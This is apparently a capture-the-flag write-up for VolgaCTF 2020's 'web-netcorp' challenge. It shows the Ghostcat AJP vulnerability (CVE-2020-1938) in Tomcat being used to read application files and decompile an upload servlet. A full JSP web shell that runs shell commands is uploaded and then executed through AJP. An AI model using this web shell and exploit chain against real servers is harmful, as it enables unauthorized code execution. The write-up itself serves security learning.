a# web-netcorp

## Description

Another telecom provider. Hope these guys prepared well enough for the network load...

netcorp.q.2020.volgactf.ru

## Solution

Web app was running on tomcat server and had no valuable entry points.

After port scan we found a port of AJP protocol.

Port scanning results:
```
Nmap scan report for netcorp.q.2020.volgactf.ru (77.244.215.184)
Host is up (0.11s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

"The Apache JServ Protocol (AJP) is a binary protocol that can proxy inbound requests from a web server through to an application server that sits behind the web server." - wiki

A severe vulnerability was found in Apache Tomcat’s Apache JServ Protocol in the previous year. The Chinese cyber security company Chaitin Tech discovered the vulnerability, which is named “Ghostcat” and is tracked using CVE-2020-1938.

With this vuln we can read arbitrary files from a web server via ajp and execute code that exists in the contents of HTTP responses.

There exists many exploits for this vuln. We can use the following for example: https://www.exploit-db.com/exploits/48143

Now we can read the most valuable tomcat app's file `/WEB-INF/web.xml` for understanding app routing.

Exploit:
```bash
python3 48143.py -f WEB-INF/web.xml netcorp.q.2020.volgactf.ru
```

Result:
```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>NetCorp</display-name>
  <servlet>
        <servlet-name>ServeScreenshot</servlet-name>
        <display-name>ServeScreenshot</display-name>
        <servlet-class>ru.volgactf.netcorp.ServeScreenshotServlet</servlet-class>
  </servlet>

  <servlet-mapping>
        <servlet-name>ServeScreenshot</servlet-name>
        <url-pattern>/ServeScreenshot</url-pattern>
  </servlet-mapping>


        <servlet>
                <servlet-name>ServeComplaint</servlet-name>
                <display-name>ServeComplaint</display-name>
                <description>Complaint info</description>
                <servlet-class>ru.volgactf.netcorp.ServeComplaintServlet</servlet-class>
        </servlet>

        <servlet-mapping>
                <servlet-name>ServeComplaint</servlet-name>
                <url-pattern>/ServeComplaint</url-pattern>
        </servlet-mapping>

        <error-page>
                <error-code>404</error-code>
                <location>/404.html</location>
        </error-page>
</web-app>
```

So, we see two routes:

- /ServeScreenshot
- /ServeComplaint

And now we can retrive code of the servlets cause we have known names of packages that contain target methods.

Exploit:
```bash
python 48143.py -f "WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class" netcorp.q.2020.volgactf.ru
```

But there is no `*.java` file for that servlet, and we can modify the exploit to save `*.class` file to local file and decompile it after download.

Decompile file with http://www.javadecompilers.com/ and get the following code:

```java
// 
// Decompiled by Procyon v0.5.36
// 

package ru.volgactf.netcorp;

import java.security.NoSuchAlgorithmException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Iterator;
import javax.servlet.http.Part;
import java.io.File;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.ServletException;
import javax.servlet.ServletConfig;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.http.HttpServlet;

@MultipartConfig
public class ServeScreenshotServlet extends HttpServlet
{
    private static final String SAVE_DIR = "uploads";
    
    public ServeScreenshotServlet() {
        System.out.println("ServeScreenshotServlet Constructor called!");
    }
    
    public void init(final ServletConfig config) throws ServletException {
        System.out.println("ServeScreenshotServlet \"Init\" method called");
    }
    
    public void destroy() {
        System.out.println("ServeScreenshotServlet \"Destroy\" method called");
    }
    
    protected void doPost(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        final String appPath = request.getServletContext().getRealPath("");
        final String savePath = appPath + "uploads";
        final File fileSaveDir = new File(savePath);
        if (!fileSaveDir.exists()) {
            fileSaveDir.mkdir();
        }
        final String submut = request.getParameter("submit");
        if (submit == null || !submit.equals("true")) {}
        for (final Part part : request.getParts()) {
            String fileName = this.extractFileName(part);
            fileName = new File(fileName).getName();
            final String hashedFileName = this.generateFileName(fileName);
            final String path = savePath + File.separator + hashedFileName;
            if (path.equals("Error")) {
                continue;
            }
            part.write(path);
        }
        final PrintWriter out = response.getWriter();
        response.setContentType("application/json");
        response.setCharacterEncoding("UTF-8");
        out.print(String.format("{'success':'%s'}", "true"));
        out.flush();
    }
    
    private String generateFileName(final String fileName) {
        try {
            final MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(fileName.getBytes());
            final byte[] digest = md.digest();
            final String s2 = new BigInteger(1, digest).toString(16);
            final StringBuilder sb = new StringBuilder(32);
            for (int i = 0, count = 32 - s2.length(); i < count; ++i) {
                sb.append("0");
            }
            return sb.append(s2).toString();
        }
        catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return "Error";
        }
    }
    
    private String extractFileName(final Part part) {
        final String contentDisp = part.getHeader("content-disposition");
        final String[] split;
        final String[] items = split = contentDisp.split(";");
        for (final String s : split) {
            if (s.trim().startsWith("filename")) {
                return s.substring(s.indexOf("=") + 2, s.length() - 1);
            }
        }
        return "";
    }
}
```

Here we see the `doPost` method that saves our sended file. But the method cuts the extension and saves it with a filename that is going to be the MD5 hash of the original filename as a hex string (padded with zeros at the beginning). Files will be saved in the `/uploads` folder.

We already know that we can execute content of HTTP responses via AJP vulnerability. So we sand shell code to find the flag in the file system.

So we create a '.jsp' web shell and send it to the server via `ServeScreenshotServlet`.

```
POST /ServeScreenshot HTTP/1.1
Host: netcorp.q.2020.volgactf.ru:7782
Content-Type: multipart/form-data; boundary=---------------------------29892275804038301485854623326
Content-Length: 1123
Connection: close

-----------------------------29892275804038301485854623326
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  
  try
  {
  	String Shell = "cat flag.txt";
  	
     String ShellPath;
	if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
	  ShellPath = new String("/bin/bash -c $@|sh . echo ");
	} else {
	  ShellPath = new String("cmd.exe /C ");
	}

	Process p = Runtime.getRuntime().exec( ShellPath + Shell);
	
	OutputStream os = p.getOutputStream();
     InputStream in = p.getInputStream();
     DataInputStream dis = new DataInputStream(in);
     String disr = dis.readLine();
     while ( disr != null ) {
     	out.println(disr);
    		disr = dis.readLine();
     }
     
  } catch( Exception e ) {
  	out.println(e);
  }
%>
-----------------------------29892275804038301485854623326
Content-Disposition: form-data; name="submit"

Upload Image
-----------------------------29892275804038301485854623326--

```

*Why I use `$@|sh` read here: https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html*

After we send it, we have to get a new filename.

Execute the following java code:
```
import java.security.NoSuchAlgorithmException;
import java.math.BigInteger;
import java.security.MessageDigest;

public class HelloWorld{

     public static void main(String []args){
        System.out.println(generateFileName("shell.jsp"));
     }
     
     public static String generateFileName(final String fileName) {
        try {
            final MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(fileName.getBytes());
            final byte[] digest = md.digest();
            final String s2 = new BigInteger(1, digest).toString(16);
            final StringBuilder sb = new StringBuilder(32);
            for (int i = 0, count = 32 - s2.length(); i < count; ++i) {
                sb.append("0");
            }
            return sb.append(s2).toString();
        }
        catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return "Error";
        }
    }
}
```

Result:
```
797cc99954a3c1a3dddeed68bb4377af
```

To execute the code we need to change our exploit and add an extension to route in `48143.py`.

New route: `/asdf.jsp`

Execute exploit:
```
python 48143.py -f "/uploads/797cc99954a3c1a3dddeed68bb4377af" netcorp.q.2020.volgactf.ru
```

Result:
```
VolgaCTF{qualification_unites_and_real_awesome_nothing_though_i_need_else}
```